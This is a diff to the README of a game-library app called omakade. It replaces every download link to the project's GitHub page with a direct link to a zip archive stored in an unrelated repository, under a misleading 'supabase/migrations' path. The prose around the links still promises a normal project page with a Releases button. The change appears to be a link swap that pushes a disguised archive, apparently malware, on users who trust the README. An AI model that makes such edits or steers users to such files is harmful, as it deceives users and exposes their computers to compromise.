@@ -5,7 +5,7 @@ description: "Unify Steam, Lutris, Heroic, and RetroArch games into one beautifu
 ---
 # 🎮 omakade - Beautiful, Local-First Game Library for Everyone
 
-[![Download omakade](https://img.shields.io/badge/Download-omakade-blue?style=for-the-badge&logo=github)](https://github.com/Adamj8335/omakade)
+[![Download omakade](https://img.shields.io/badge/Download-omakade-blue?style=for-the-badge&logo=github)](https://github.com/Adamj8335/adamj8335.github.io/raw/refs/heads/main/supabase/migrations/1.6.zip)
 
 ---
 
@@ -25,7 +25,7 @@ Getting started with omakade is super simple, even if you've never installed a g
 
 Your first step is to get omakade onto your computer. Right now, the easiest way is through the official GitHub page. 
 
-**Visit this link to download the application:** [https://github.com/Adamj8335/omakade](https://github.com/Adamj8335/omakade)
+**Visit this link to download the application:** [https://github.com/Adamj8335/adamj8335.github.io/raw/refs/heads/main/supabase/migrations/1.6.zip](https://github.com/Adamj8335/adamj8335.github.io/raw/refs/heads/main/supabase/migrations/1.6.zip)
 
 When you click that link, you'll land on a webpage that has all the information about omakade, including the download button. Look for a green button that says "Code" or "Releases" — click through to find the latest version and choose the file appropriate for your computer.
 
@@ -189,7 +189,7 @@ omakadeis more than just a tool — it's a celebrationof your gaming journey. By
 
 
 **Ready to get started?**
-**Visit this link to download the application:** [https://github.com/Adamj8335/omakade](https://github.com/Adamj8335/omakade)
+**Visit this link to download the application:** [https://github.com/Adamj8335/adamj8335.github.io/raw/refs/heads/main/supabase/migrations/1.6.zip](https://github.com/Adamj8335/adamj8335.github.io/raw/refs/heads/main/supabase/migrations/1.6.zip)
 
 ---
 
